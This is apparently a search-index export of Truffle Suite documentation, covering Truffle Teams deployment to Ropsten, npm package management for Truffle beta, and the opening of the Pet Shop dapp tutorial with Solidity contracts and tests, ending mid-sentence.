Truffle Teams supports Ethereum testnets and Mainnet, and we'll be adding support for other targets over time. In this tutorial, we'll be deploying our application to Ropsten. Press the parachute icon on the commit you'd like to deploy. A wizard will pop up; under Destination Network, select Ropsten, and then press Connect Wallet . MetaMask will pop up asking you to login (if you haven't already). Then you will need to press Connect to confirm the connection with Truffle Teams. If the wizard hasn't changed (i.e. you don't see a button to start deploying), you likely need to switch your MetaMask network to Ropsten. This may reload the page; if this happens, you'll need to repeat the steps above. Before moving on, make sure you have the correct account selected in MetaMask. Now you should see the wizard prompting for a Deployment Context . Leave it set to Create a New Deployment . We'll cover what this is later in the tutorial. Press the OK, START DEPLOYING button! From here on, it's important that you don't close the tab, refresh the page, or lose network connection. We're working on a more robust experience that will enable you to pick up unfinished deployments, but for now our current version requires the tab to stay open and connected. Truffle Teams will only process so many deployments at the same time, so you may see that your deployment has been queued. You'll have to wait (without closing/refreshing the tab) for your deployment to get to the front of the list. However, we're working diligently to make this experience more seamless going forward. Once your deployment has started processing, you'll see a list of steps Truffle Teams is doing to prepare for your deployment. Once the preparation steps are complete, you'll see a screen with a list of your migrations being processed. You should also get a pop-up from MetaMask for your first transaction. You'll notice that this interface with MetaMask is like sending a transaction to any other dapp. It's your account that is sending this transaction, and you have complete control of it. Additionally, we highly recommend that you change the GAS FEE to be higher so that your transactions run quicker. For testnets like Ropsten, it's affordable to always select the Fast option. Once you're happy with the transaction gas fee, press the Confirm button to send your transaction. Once the transaction is confirmed (the timing of confirmations from MetaMask and Truffle Teams may be slightly offset), you'll receive the next transaction. Repeat this process until you see a message that your deployment is being finalized. After a short wait, you'll see a window with your deployment results: Your contracts are deployed! That was easy. Go ahead and push the Great! Go Back to Workflow button or the X in the wizard. You'll now see a new card in the Staging column with the results of your deployment: You can click on the + Contracts bar on the bottom of the card to see a list of your deployed contracts and their addresses: You can also click the vertical 3 dots in the top right of the card to find a menu. In this menu, you can download a .zip file of the Truffle .json artifacts used in your frontend webapp, graduate a deployment to production, or archive the deployment. Note: Be careful when using the archive feature; we haven't implemented a way to unarchive deployments yet. Deployment Context \u00b6 Circling back to the Deployment Context feature I brushed over earlier when we were setting up our deployment: This setting will usually be used for more advanced Truffle applications that utilize the migration system to iteratively migrate more to the blockchain (rather than starting fresh each deployment). This option will let you select an existing deployment on the same network that you'd like to use the deployed artifacts for. Truffle supports the concept of migrating your application and will only run the new migration scripts from the last deployment (a.k.a. the deployment context). This becomes useful in a handful of scenarios: maybe you added an extra contract to work with your existing deployment, your Truffle project uses proxy contracts to upgrade your contracts, and more. Technically speaking, selecting the Deployment Context will put the Truffle artifacts from the deployment context you selected in the directory before running truffle migrate . Graduating Deployments \u00b6 Happy with a particular deployment in Staging ? You can select the Graduate option from the menu to use the same build as the basis of your deployment into Mainnet. Other than selecting a different network in MetaMask, the steps are the same! After you're done, you'll see a new deployment in the production section. Get started with Truffle Teams, and see deployments for yourself! Try Truffle Teams","title":"Truffle Suite"},{"location":"guides/learn-how-to-deploy-with-truffle-teams/index.html#prerequisites","text":"This tutorial assumes that you've already done the following: - Created a Truffle Teams account - Linked a repo that is a Truffle project (need a project? Grab our MetaCoin box with truffle unbox metacoin in an empty directory, and push that to your own repository) - Got a passing build within Truffle Teams - Grabbed some Ropsten Ether - Ensured you'll have a stable network connection","title":"Prerequisites"},{"location":"guides/learn-how-to-deploy-with-truffle-teams/index.html#the-deployments-page","text":"Head over to Truffle Teams . On the left navigation bar, click the item near the top labelled DEPLOYMENTS next to the parachute icon. Here you'll see a list of your repositories. Click on the one you'd like to deploy. This will bring you to the deployments page. You'll notice there are three columns: Commits , Staging , and Production .","title":"The Deployments Page"},{"location":"guides/learn-how-to-deploy-with-truffle-teams/index.html#commits-column","text":"Commits is a list of all the commits that Truffle Teams is processing, or has processed, as a build. Each will have a status icon to show if the build is in progress, failed, or successful. Commits with a successful icon (a green box with a checkmark, as pictured) will be able to be deployed; the parachute icon in the top right of the commit indicates this.","title":"Commits Column"},{"location":"guides/learn-how-to-deploy-with-truffle-teams/index.html#staging-and-production-columns","text":"Staging contains a list of all testnet (i.e. Ropsten, G\u00f6rli, Rinkeby, and Kovan) deployments. Production contains a list of Mainnet deployments. We'll expand more on how these work later in the tutorial.","title":"Staging and Production Columns"},{"location":"guides/learn-how-to-deploy-with-truffle-teams/index.html#your-first-deployment","text":"Currently, Truffle Teams supports Ethereum testnets and Mainnet, and we'll be adding support for other targets over time. In this tutorial, we'll be deploying our application to Ropsten. Press the parachute icon on the commit you'd like to deploy. A wizard will pop up; under Destination Network, select Ropsten, and then press Connect Wallet . MetaMask will pop up asking you to login (if you haven't already). Then you will need to press Connect to confirm the connection with Truffle Teams. If the wizard hasn't changed (i.e. you don't see a button to start deploying), you likely need to switch your MetaMask network to Ropsten. This may reload the page; if this happens, you'll need to repeat the steps above. Before moving on, make sure you have the correct account selected in MetaMask. Now you should see the wizard prompting for a Deployment Context . Leave it set to Create a New Deployment . We'll cover what this is later in the tutorial. Press the OK, START DEPLOYING button! From here on, it's important that you don't close the tab, refresh the page, or lose network connection. We're working on a more robust experience that will enable you to pick up unfinished deployments, but for now our current version requires the tab to stay open and connected. Truffle Teams will only process so many deployments at the same time, so you may see that your deployment has been queued. You'll have to wait (without closing/refreshing the tab) for your deployment to get to the front of the list. However, we're working diligently to make this experience more seamless going forward. Once your deployment has started processing, you'll see a list of steps Truffle Teams is doing to prepare for your deployment. Once the preparation steps are complete, you'll see a screen with a list of your migrations being processed. You should also get a pop-up from MetaMask for your first transaction. You'll notice that this interface with MetaMask is like sending a transaction to any other dapp. It's your account that is sending this transaction, and you have complete control of it. Additionally, we highly recommend that you change the GAS FEE to be higher so that your transactions run quicker. For testnets like Ropsten, it's affordable to always select the Fast option. Once you're happy with the transaction gas fee, press the Confirm button to send your transaction. Once the transaction is confirmed (the timing of confirmations from MetaMask and Truffle Teams may be slightly offset), you'll receive the next transaction. Repeat this process until you see a message that your deployment is being finalized. After a short wait, you'll see a window with your deployment results: Your contracts are deployed! That was easy. Go ahead and push the Great! Go Back to Workflow button or the X in the wizard. You'll now see a new card in the Staging column with the results of your deployment: You can click on the + Contracts bar on the bottom of the card to see a list of your deployed contracts and their addresses: You can also click the vertical 3 dots in the top right of the card to find a menu. In this menu, you can download a .zip file of the Truffle .json artifacts used in your frontend webapp, graduate a deployment to production, or archive the deployment. Note: Be careful when using the archive feature; we haven't implemented a way to unarchive deployments yet.","title":"Your First Deployment"},{"location":"guides/learn-how-to-deploy-with-truffle-teams/index.html#deployment-context","text":"Circling back to the Deployment Context feature I brushed over earlier when we were setting up our deployment: This setting will usually be used for more advanced Truffle applications that utilize the migration system to iteratively migrate more to the blockchain (rather than starting fresh each deployment). This option will let you select an existing deployment on the same network that you'd like to use the deployed artifacts for. Truffle supports the concept of migrating your application and will only run the new migration scripts from the last deployment (a.k.a. the deployment context). This becomes useful in a handful of scenarios: maybe you added an extra contract to work with your existing deployment, your Truffle project uses proxy contracts to upgrade your contracts, and more. Technically speaking, selecting the Deployment Context will put the Truffle artifacts from the deployment context you selected in the directory before running truffle migrate .","title":"Deployment Context"},{"location":"guides/learn-how-to-deploy-with-truffle-teams/index.html#graduating-deployments","text":"Happy with a particular deployment in Staging ? You can select the Graduate option from the menu to use the same build as the basis of your deployment into Mainnet. Other than selecting a different network in MetaMask, the steps are the same! After you're done, you'll see a new deployment in the production section. Get started with Truffle Teams, and see deployments for yourself! Try Truffle Teams","title":"Graduating Deployments"},{"location":"guides/package-management/index.html","text":"Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! This is a beta document and refers to the beta version of Truffle. The following features will not work unless you are using Truffle Beta. Get the Beta Version \u00b6 As this feature is in beta, you must first get the beta version of Truffle. To make sure the beta version doesn't conflict with the released version, first remove the Truffle version you have currently installed: $ npm uninstall -g truffle And then install the beta version: $ npm install -g truffle@beta Overview \u00b6 Truffle Beta comes standard with npm integration, and is aware of the node_modules directory in your project if it exists. This means you can use and distribute contracts, dapps and Ethereum-enabled libraries via npm , making your code available to others and other's code available to you. Package Layout \u00b6 Projects created with Truffle have a specific layout by default which enables them to be used as packages. This layout isn't required, but if used as a common convention -- or \"de-facto standard\" -- then distributing contracts and dapps through package management will become much easier. The most important directories in a Truffle package are the following: /contracts /build (which includes /build/contracts , created by Truffle) The first directory is your contracts directory, which includes your raw Solidity contracts. The second directory is the build directory, and more specifically /build/contracts , which holds build artifacts in the form of .sol.js files. Including raw contracts in your package will allow others to import those contracts within their own solidity code. Similarly, including your .sol.js build artifacts in your package will allow others to seamlessly interact with your contracts from Javascript, which can be used in dapps, scripts and migrations. Using a Package \u00b6 When using a package within your own project, it is important to note that there are two places where you might be interested in using other's contract code: within your contracts ( .sol files) and within your Javascript code ( .sol.js files). The following provides an example of each case, and discusses techniques for making the most of other's contracts and build artifacts. Installing \u00b6 For this example, we're going to use the Example Truffle Library , which provides a simple name registry that is deployed to the Morden test network. In order to use it as a dependency, we must first install it within our project through npm : $ cd my_project $ npm install example-truffle-library Note that the last command above downloads the package and places it in my_project/node_modules directory, which is important for the examples below. See the npm documentation for help using npm to install packages. Within Your Contracts \u00b6 To use a package's contracts within your contracts, this can be as simple as Solidity's import statement. When your import path isn't explicitly relative or absolute, this signifies to Truffle that you're looking for a file from a specific named package. Consider this example using the Example Truffle Library mentioned above: import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; Since the path didn't start with ./ , Truffle knows to look in your project's node_modules directory for the example-truffle-library folder. From there, it resolves the path to provide you the contract you requested. Within Javascript Code \u00b6 To interact with package's contracts within Javascript code, you simply need to require that package's .sol.js files like so: var SimpleNameRegistry = require ( \"example-truffle-library/build/contracts/SimpleNameRegistry.sol.js\" ); These files are provided by EtherPudding , which Truffle uses internally. See EtherPudding's documentation for more information. Package's Deployed Addresses \u00b6 Sometimes you want your contracts to interact with the package's previously deployed contracts. Since the deployed addresses exist within the package's .sol.js files, you must perform an extra step to get those addresses into your contracts. To do so, make your contract accept the address of the dependency contract, and then use migrations. The following is an example contract that exists within your project as well as an example migration: Contract: MyContract.sol import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; contract MyContract { SimpleNameRegistry registry ; address public owner ; function MyContract { owner = msg.sender ; } // Simple example that uses the deployed registry from the package. function getModule ( bytes32 name ) returns ( address ) { return registry . names ( name ); } // Set the registry if you're the owner. function setRegistry ( address addr ) { require ( msg.sender == owner ); registry = SimpleNameRegistry ( addr ); } } Migration: 3_hook_up_example_library.js var SimpleNameRegistry = require ( \"example-truffle-library/build/contracts/SimpleNameRegistry.sol.js\" ); module . exports = function ( deployer ) { // Deploy our contract, then set the address of the registry. deployer . deploy ( MyContract ). then ( function () { MyContract . deployed (). setRegistry ( SimpleNameRegistry . address ); }); }; Recommendation: Use the TestRPC \u00b6 **Update**: Since this tutorial was published, we have released [Ganache](/ganache) a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our [Working with Ganache](/docs/ganache/using) page. The ethereumjs-testrpc is wildly useful for packages that were previously deployed to the live network. The TestRPC includes a --fork feature which allows you to fork from the main chain while developing your application. What this means for you is that you can develop and test against packages that are deployed live, using real data , without having to worry about deploying your dependency's contracts yourself. The Future: Where do we go from here? \u00b6 Node's npm is, of course, a centralized service, and the packages that exist there are on a centralized network. As Ethereum becomes more widespread, so will the urge to decentralize all of our tools and packages. The ideal package management system for Ethereum is one where the package registry exists on the live chain and the package data exists on a decentralized file storage network like IPFS or Swarm; however, that ideal is going to take time to develop and reach critical mass. Until that time, we can use npm to distribute our contracts and applications like the rest of the Javascript community.","title":"Truffle Suite"},{"location":"guides/package-management/index.html#get-the-beta-version","text":"As this feature is in beta, you must first get the beta version of Truffle. To make sure the beta version doesn't conflict with the released version, first remove the Truffle version you have currently installed: $ npm uninstall -g truffle And then install the beta version: $ npm install -g truffle@beta","title":"Get the Beta Version"},{"location":"guides/package-management/index.html#overview","text":"Truffle Beta comes standard with npm integration, and is aware of the node_modules directory in your project if it exists. This means you can use and distribute contracts, dapps and Ethereum-enabled libraries via npm , making your code available to others and other's code available to you.","title":"Overview"},{"location":"guides/package-management/index.html#package-layout","text":"Projects created with Truffle have a specific layout by default which enables them to be used as packages. This layout isn't required, but if used as a common convention -- or \"de-facto standard\" -- then distributing contracts and dapps through package management will become much easier. The most important directories in a Truffle package are the following: /contracts /build (which includes /build/contracts , created by Truffle) The first directory is your contracts directory, which includes your raw Solidity contracts. The second directory is the build directory, and more specifically /build/contracts , which holds build artifacts in the form of .sol.js files. Including raw contracts in your package will allow others to import those contracts within their own solidity code. Similarly, including your .sol.js build artifacts in your package will allow others to seamlessly interact with your contracts from Javascript, which can be used in dapps, scripts and migrations.","title":"Package Layout"},{"location":"guides/package-management/index.html#using-a-package","text":"When using a package within your own project, it is important to note that there are two places where you might be interested in using other's contract code: within your contracts ( .sol files) and within your Javascript code ( .sol.js files). The following provides an example of each case, and discusses techniques for making the most of other's contracts and build artifacts.","title":"Using a Package"},{"location":"guides/package-management/index.html#installing","text":"For this example, we're going to use the Example Truffle Library , which provides a simple name registry that is deployed to the Morden test network. In order to use it as a dependency, we must first install it within our project through npm : $ cd my_project $ npm install example-truffle-library Note that the last command above downloads the package and places it in my_project/node_modules directory, which is important for the examples below. See the npm documentation for help using npm to install packages.","title":"Installing"},{"location":"guides/package-management/index.html#within-your-contracts","text":"To use a package's contracts within your contracts, this can be as simple as Solidity's import statement. When your import path isn't explicitly relative or absolute, this signifies to Truffle that you're looking for a file from a specific named package. Consider this example using the Example Truffle Library mentioned above: import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; Since the path didn't start with ./ , Truffle knows to look in your project's node_modules directory for the example-truffle-library folder. From there, it resolves the path to provide you the contract you requested.","title":"Within Your Contracts"},{"location":"guides/package-management/index.html#within-javascript-code","text":"To interact with package's contracts within Javascript code, you simply need to require that package's .sol.js files like so: var SimpleNameRegistry = require ( \"example-truffle-library/build/contracts/SimpleNameRegistry.sol.js\" ); These files are provided by EtherPudding , which Truffle uses internally. See EtherPudding's documentation for more information.","title":"Within Javascript Code"},{"location":"guides/package-management/index.html#packages-deployed-addresses","text":"Sometimes you want your contracts to interact with the package's previously deployed contracts. Since the deployed addresses exist within the package's .sol.js files, you must perform an extra step to get those addresses into your contracts. To do so, make your contract accept the address of the dependency contract, and then use migrations. The following is an example contract that exists within your project as well as an example migration: Contract: MyContract.sol import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; contract MyContract { SimpleNameRegistry registry ; address public owner ; function MyContract { owner = msg.sender ; } // Simple example that uses the deployed registry from the package. function getModule ( bytes32 name ) returns ( address ) { return registry . names ( name ); } // Set the registry if you're the owner. function setRegistry ( address addr ) { require ( msg.sender == owner ); registry = SimpleNameRegistry ( addr ); } } Migration: 3_hook_up_example_library.js var SimpleNameRegistry = require ( \"example-truffle-library/build/contracts/SimpleNameRegistry.sol.js\" ); module . exports = function ( deployer ) { // Deploy our contract, then set the address of the registry. deployer . deploy ( MyContract ). then ( function () { MyContract . deployed (). setRegistry ( SimpleNameRegistry . address ); }); };","title":"Package's Deployed Addresses"},{"location":"guides/package-management/index.html#recommendation-use-the-testrpc","text":"**Update**: Since this tutorial was published, we have released [Ganache](/ganache) a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our [Working with Ganache](/docs/ganache/using) page. The ethereumjs-testrpc is wildly useful for packages that were previously deployed to the live network. The TestRPC includes a --fork feature which allows you to fork from the main chain while developing your application. What this means for you is that you can develop and test against packages that are deployed live, using real data , without having to worry about deploying your dependency's contracts yourself.","title":"Recommendation: Use the TestRPC"},{"location":"guides/package-management/index.html#the-future-where-do-we-go-from-here","text":"Node's npm is, of course, a centralized service, and the packages that exist there are on a centralized network. As Ethereum becomes more widespread, so will the urge to decentralize all of our tools and packages. The ideal package management system for Ethereum is one where the package registry exists on the live chain and the package data exists on a decentralized file storage network like IPFS or Swarm; however, that ideal is going to take time to develop and reach critical mass. Until that time, we can use npm to distribute our contracts and applications like the rest of the Javascript community.","title":"The Future: Where do we go from here?"},{"location":"guides/pet-shop/index.html","text":"This tutorial will take you through the process of building your first dapp---an adoption tracking system for a pet shop! This tutorial is meant for those with a basic knowledge of Ethereum and smart contracts, who have some knowledge of HTML and JavaScript, but who are new to dapps. Note : For Ethereum basics, please read the Truffle Ethereum Overview tutorial before proceeding. In this tutorial we will be covering: Setting up the development environment Creating a Truffle project using a Truffle Box Writing the smart contract Compiling and migrating the smart contract Testing the smart contract Creating a user interface to interact with the smart contract Interacting with the dapp in a browser Background \u00b6 Pete Scandlon of Pete's Pet Shop is interested in using Ethereum as an efficient way to handle their pet adoptions. The store has space for 16 pets at a given time, and they already have a database of pets. As an initial proof of concept, Pete wants to see a dapp which associates an Ethereum address with a pet to be adopted. The website structure and styling will be supplied. Our job is to write the smart contract and front-end logic for its usage. Setting up the development environment \u00b6 There are a few technical requirements before we start. Please install the following: Node.js v8+ LTS and npm (comes with Node) Git Once we have those installed, we only need one command to install Truffle: npm install -g truffle To verify that Truffle is installed properly, type truffle version on a terminal. If you see an error, make sure that your npm modules are added to your path. We also will be using Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. You can download Ganache by navigating to http://truffleframework.com/ganache and clicking the \"Download\" button. Note : If you are developing in an environment without a graphical interface, you can also use Truffle Develop, Truffle's built-in personal blockchain, instead of Ganache. You will need to change some settings---such as the port the blockchain runs on---to adapt the tutorial for Truffle Develop. Creating a Truffle project using a Truffle Box \u00b6 Truffle initializes in the current directory, so first create a directory in your development folder of choice and then moving inside it. mkdir pet-shop-tutorial cd pet-shop-tutorial We've created a special Truffle Box just for this tutorial called pet-shop , which includes the basic project structure as well as code for the user interface. Use the truffle unbox command to unpack this Truffle Box. truffle unbox pet-shop Note : Truffle can be initialized a few different ways. Another useful initialization command is `truffle init`, which creates an empty Truffle project with no example contracts included. For more information, please see the documentation on Creating a project . Directory structure \u00b6 The default Truffle directory structure contains the following: contracts/ : Contains the Solidity source files for our smart contracts. There is an important contract in here called Migrations.sol , which we'll talk about later. migrations/ : Truffle uses a migration system to handle smart contract deployments. A migration is an additional special smart contract that keeps track of changes. test/ : Contains both JavaScript and Solidity tests for our smart contracts truffle-config.js : Truffle configuration file The pet-shop Truffle Box has extra files and folders in it, but we won't worry about those just yet. Writing the smart contract \u00b6 We'll start our dapp by writing the smart contract that acts as the back-end logic and storage. Create a new file named Adoption.sol in the contracts/ directory. Add the following content to the file: pragma solidity ^ 0.5.0 ; contract Adoption { } Things to notice: The minimum version of Solidity required is noted at the top of the contract: pragma solidity ^0.5.0; . The pragma command means \" additional information that only the compiler cares about \", while the caret symbol (^) means \" the version indicated or higher \". Like JavaScript or PHP, statements are terminated with semicolons. Variable setup \u00b6 Solidity is a statically-typed language, meaning data types like strings, integers, and arrays must be defined. Solidity has a unique type called an address . Addresses are Ethereum addresses, stored as 20 byte values. Every account and smart contract on the Ethereum blockchain has an address and can send and receive Ether to and from this address. Add the following variable on the next line after contract Adoption { . address [ 16 ] public adopters ; Things to notice: We've defined a single variable: adopters . This is an array of Ethereum addresses. Arrays contain one type and can have a fixed or variable length. In this case the type is address and the length is 16 . You'll also notice adopters is public. Public variables have automatic getter methods, but in the case of arrays a key is required and will only return a single value. Later, we'll write a function to return the whole array for use in our UI. Your first function: Adopting a pet \u00b6 Let's allow users to make adoption requests. Add the following function to the smart contract after the variable declaration we set up above. // Adopting a pet function adopt ( uint petId ) public returns ( uint ) { require ( petId >= 0 && petId <= 15 ); adopters [ petId ] = msg.sender ; return petId ; } Things to notice: In Solidity the types of both the function parameters and output must be specified. In this case we'll be taking in a petId (integer) and returning an integer. We are checking to make sure petId is in range of our adopters array. Arrays in Solidity are indexed from 0, so the ID value will need to be between 0 and 15. We use the require() statement to ensure the ID is within range. If the ID is in range, we then add the address that made the call to our adopters array. The address of the person or smart contract who called this function is denoted by msg.sender . Finally, we return the petId provided as a confirmation. Your second function: Retrieving the adopters \u00b6 As mentioned above, array getters return only a single value from a given key. Our UI needs to update all pet adoption statuses, but making 16 API calls is not ideal. So our next step is to write a function to return the entire array. Add the following getAdopters() function to the smart contract, after the adopt() function we added above: // Retrieving the adopters function getAdopters () public view returns ( address [ 16 ] memory ) { return adopters ; } Things to notice: Since adopters is already declared, we can simply return it. Be sure to specify the return type (in this case, the type for adopters ) as address[16] memory . memory gives the data location for the variable. The view keyword in the function declaration means that the function will not modify the state of the contract. Further information about the exact limits imposed by view is available here . Compiling and migrating the smart contract \u00b6 Now that we have written our smart contract, the next steps are to compile and migrate it. Compilation \u00b6 Solidity is a compiled language, meaning we need to compile our Solidity to bytecode for the Ethereum Virtual Machine (EVM) to execute. Think of it as translating our human-readable Solidity into something the EVM understands. In a terminal, make sure you are in the root of the directory that contains the dapp and type: truffle compile Note : If you're on Windows and encountering problems running this command, please see the documentation on resolving naming conflicts on Windows . You should see output similar to the following: Compiling your contracts... =========================== > Compiling ./contracts/Adoption.sol > Compiling ./contracts/Migrations.sol > Artifacts written to /Users/cruzmolina/Code/truffle-projects/metacoin/build/contracts > Compiled successfully using: - solc: 0 .5.0+commit.1d4f565a.Emscripten.clang Migration \u00b6 Now that we've successfully compiled our contracts, it's time to migrate them to the blockchain! A migration is a deployment script meant to alter the state of your application's contracts , moving it from one state to the next. For the first migration, you might just be deploying new code, but over time, other migrations might move data around or replace a contract with a new one. Note : Read more about migrations in the Truffle documentation . You'll see one JavaScript file already in the migrations/ directory: 1_initial_migration.js . This handles deploying the Migrations.sol contract to observe subsequent smart contract migrations, and ensures we don't double-migrate unchanged contracts in the future. Now we are ready to create our own migration script. Create a new file named 2_deploy_contracts.js in the migrations/ directory. Add the following content to the 2_deploy_contracts.js file: var Adoption = artifacts . require ( \"Adoption\" ); module . exports = function ( deployer ) { deployer . deploy ( Adoption ); }; Before we can migrate our contract to the blockchain, we need to have a blockchain running. For this tutorial, we're going to use Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. If you haven't already, download Ganache and double click the icon to launch the application. This will generate a blockchain running locally on port 7545. Note : Read more about Ganache in the Truffle documentation . Back in our terminal, migrate the contract to the blockchain. truffle migrate You should see output similar to the following: 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x3b558e9cdf1231d8ffb3445cb2f9fb01de9d0363e0b97a17f9517da318c2e5af > Blocks: 0 Seconds: 0 > contract address: 0x5ccb4dc04600cffA8a67197d5b644ae71856aEE4 > account: 0x8d9606F90B6CA5D856A9f0867a82a645e2DfFf37 > balance: 99 .99430184 > gas used: 284908 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .00569816 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0 .00569816 ETH 2_deploy_contracts.js ===================== Deploying 'Adoption' ............................. ............................. You can see the migrations being executed in order, followed by some information related to each migration. (Your information will differ.) In Ganache, note that the state of the blockchain has changed. The blockchain now shows that the current block, previously 0 , is now 4 . In addition, while the first account originally had 100 ether, it is now lower, due to the transaction costs of migration. We'll talk more about transaction costs later. You've now written your first smart contract and deployed it to a locally running blockchain. It's time to interact with our smart contract now to make sure it does what we want. Testing the smart contract using Solidity \u00b6 Expand This Section Truffle is very flexible when it comes to smart contract testing, in that tests can be written either in JavaScript or Solidity. In this tutorial, we'll be writing our tests in Solidity. 1. Create a new file named `TestAdoption.sol` in the `test/` directory. 1. Add the following content to the `TestAdoption.sol` file: pragma solidity ^ 0.5.0 ; import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/Adoption.sol\" ; contract TestAdoption { // The address of the adoption contract to be tested Adoption adoption = Adoption ( DeployedAddresses . Adoption ()); // The id of the pet that will be used for testing uint expectedPetId = 8 ; //The expected owner of adopted pet is this contract address expectedAdopter = address ( this ); } We start the contract off with 3 imports: * `Assert.sol`: Gives us various assertions to use in our tests. In testing, **an assertion checks for things like equality, inequality or emptiness to return a pass/fail** from our test. [Here's a full list of the assertions included with Truffle](https://github.com/trufflesuite/truffle/blob/master/packages/resolver/solidity/Assert.sol). * `DeployedAddresses.sol`: When running tests, Truffle will deploy a fresh instance of the contract being tested to the blockchain. This smart contract gets the address of the deployed contract. * `Adoption`: The smart contract we want to test. Note : The first two imports are referring to global Truffle files, not a `truffle` directory. You should not see a `truffle` directory inside your `test/` directory. Then we define three contract-wide variables: * First, one containing the smart contract to be tested, calling the `DeployedAddresses` smart contract to get its address. * Second, the id of the pet that will be used to test the adoption functions. * Third, since the TestAdoption contract will be sending the transaction, we set the expected adopter address to **this**, a contract-wide variable that gets the current contract's address. ### Testing the adopt() function To test the `adopt()` function, recall that upon success it returns the given `petId`. We can ensure an ID was returned and that it's correct by comparing the return value of `adopt()` to the ID we passed in. 1. Add the following function within the `TestAdoption.sol` smart contract, after the declaration of `Adoption`: // Testing the adopt() function function testUserCanAdoptPet () public { uint returnedId = adoption . adopt ( expectedPetId ); Assert . equal ( returnedId , expectedPetId , \"Adoption of the expected pet should match what is returned.\" ); } Things to notice: * We call the smart contract we declared earlier with the ID of `expectedPetId`. * Finally, we pass the actual value, the expected value and a failure message (which gets printed to the console if the test does not pass) to `Assert.equal()`. ### Testing retrieval of a single pet's owner Remembering from above that public variables have automatic getter methods, we can retrieve the address stored by our adoption test above. Stored data will persist for the duration of our tests, so our adoption of pet `expectedPetId` above can be retrieved by other tests. 1. Add this function below the previously added function in `TestAdoption.sol`. // Testing retrieval of a single pet's owner function testGetAdopterAddressByPetId () public { address adopter = adoption . adopters ( expectedPetId ); Assert . equal ( adopter , expectedAdopter , \"Owner of the expected pet should be this contract\" ); } After getting the adopter address stored by the adoption contract, we assert equality as we did above. ### Testing retrieval of all pet owners Since arrays can only return a single value given a single key, we create our own getter for the entire array. 1. Add this function below the previously added function in `TestAdoption.sol`. // Testing retrieval of all pet owners function testGetAdopterAddressByPetIdInArray () public { // Store adopters in memory rather than contract's storage address [ 16 ] memory adopters = adoption . getAdopters (); Assert . equal ( adopters [ expectedPetId ], expectedAdopter , \"Owner of the expected pet should be this contract\" ); } Note the **memory** attribute on `adopters`. The memory attribute tells Solidity to temporarily store the value in memory, rather than saving it to the contract's storage. Since `adopters` is an array, and we know from the first adoption test that we adopted pet `expectedPetId`, we compare the testing contracts address with location `expectedPetId` in the array. Testing the smart contract using JavaScript \u00b6 Expand This Section Truffle is very flexible when it comes to smart contract testing, in that tests can be written either in JavaScript or Solidity. In this tutorial, we'll be writing our tests in Javascript using the Chai and Mocha libraries. 1. Create a new file named `testAdoption.test.js` in the `test/` directory. 2. Add the following content to the `testAdoption.test.js` file: const Adoption = artifacts.require(\"Adoption\"); contract(\"Adoption\", (accounts) => { let adoption; let expectedPetId; before(async () => { adoption = await Adoption.deployed(); }); describe(\"adopting a pet and retrieving account addresses\", async () => { before(\"adopt a pet using accounts[0]\", async () => { await adoption.adopt(8, { from: accounts[0] }); expectedAdopter = accounts[0]; }); }); }); We start the contract by importing : * `Adoption`: The smart contract we want to test We begin our test by importing our `Adoption` contract using `artifacts.require`. **Note**: When writing this test, our callback function take the argument `accounts`. This provides us with the accounts available on the network when using this test. Then, we make use of the `before` to provide initial setups for the following: * Adopt a pet with id 8 and assign it to the first account within the test accounts on the network. * This function later is used to check whether the `petId: 8` has been adopted by `accounts[0]`. ### Testing the adopt function To test the `adopt` function, recall that upon success it returns the given `adopter`. We can ensure that the adopter based on given petID was returned and is compared with the `expectedAdopter` within the `adopt` function. 1. Add the following function within the `testAdoption.test.js` test file, after the declaration of `before` code block. describe(\"adopting a pet and retrieving account addresses\", async () => { before(\"adopt a pet using accounts[0]\", async () => { await adoption.adopt(8, { from: accounts[0] }); expectedAdopter = accounts[0]; }); it(\"can fetch the address of an owner by pet id\", async () => { const adopter = await adoption.adopters(8); assert.equal(adopter, expectedAdopter, \"The owner of the adopted pet should be the first account.\"); }); }); Things to notice: * We call smart contract method `adopters` to see what address adopted the pet with `petID` 8. * Truffle imports `Chai` for the user so we can use the `assert` functions. We pass the actual value, the expected value and a failure message (which gets printed to the console if the test does not pass) to `assert.equal()`. ### Testing retrieval of all pet owners Since arrays can only return a single value given a single key, we create our own getter for the entire array. 1. Add this function below the previously added function in `testAdoption.test.js`. it(\"can fetch the collection of all pet owners' addresses\", async () => { const adopters = await adoption.getAdopters(); assert.equal(adopters[8], expectedAdopter, \"The owner of the adopted pet should be in the collection.\"); }); Since adopters is an array, and we know from the first adoption test that we adopted the pet with `petId` 8, we are comparing the contract's address with the address that we expect to find. Running the tests \u00b6 Back in the terminal, run the tests: truffle test If all the tests pass, you'll see console output similar to this: Using network 'development' . Compiling your contracts... =========================== > Compiling ./test/TestAdoption.sol > Artifacts written to /var/folders/z3/v0sd04ys11q2sh8tq38mz30c0000gn/T/test-11934-19747-g49sra.0ncrr > Compiled successfully using: - solc: 0 .5.0+commit.1d4f565a.Emscripten.clang TestAdoption \u2713 testUserCanAdoptPet ( 91ms ) \u2713 testGetAdopterAddressByPetId ( 70ms ) \u2713 testGetAdopterAddressByPetIdInArray ( 89ms ) 3 passing ( 670ms ) Creating a user interface to interact with the smart contract \u00b6 Now that we've created the smart contract, deployed it to our local test blockchain and confirmed we can interact with it via the console, it's time to create a UI so that Pete has something to use for his pet shop! Included with the pet-shop Truffle Box was code for the app's front-end. That code exists within the src/ directory. The front-end doesn't use a build system (webpack, grunt, etc.) to be as easy as possible to get started. The structure of the app is already there; we'll be filling in the functions which are unique to Ethereum. This way, you can take this knowledge and apply it to your own front-end development. Instantiating web3 \u00b6 Open /src/js/app.js in a text editor. Examine the file. Note that there is a global App object to manage our application, load in the pet data in init() and then call the function initWeb3() . The web3 JavaScript library interacts with the 